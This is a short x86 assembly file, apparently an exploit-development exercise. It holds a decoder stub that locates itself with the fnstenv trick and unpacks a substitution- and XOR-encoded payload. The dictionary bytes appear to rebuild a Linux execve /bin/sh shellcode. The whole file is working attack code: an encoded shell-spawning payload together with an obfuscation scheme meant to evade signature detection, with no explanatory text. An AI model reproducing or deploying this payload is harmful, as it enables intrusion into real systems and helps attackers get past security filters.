; subst-encoder.asm
; Author: Reuben Sammut

global _start

section .text

_start:
	fldz
	fnstenv [esp - 0xc]
	pop edi
	add edi, 0x22		; length of stub 
	lea esi, [edi]
	add esi, 0x1F 		; length of shellcode + 1
	xor eax, eax

decode:
	mov al, byte [edi]
	xor al, 0x40		; xorkey
	jz EncodedShellcode
	lea ebx, [esi]
	add ebx, eax
	mov al, byte [ebx]
	mov byte [edi], al
	inc edi
	jmp decode


	EncodedShellcode: db 0x4b,0x4f,0x50,0x4c,0x4e,0x53,0x42,0x4c,0x4c,0x4e,0x47,0x52,0x4a,0x4c,0x4a,0x4a,0x4a,0x4a,0x51,0x43,0x50,0x51,0x4d,0x44,0x51,0x45,0x49,0x41,0x48,0x46,0x40

	Dictionary: db 0x40,0x0b,0x73,0xe3,0x53,0xe1,0x80,0x69,0xcd,0xb0,0x2f,0x31,0x68,0xe2,0x62,0xc0,0x50,0x89,0x6e,0x61
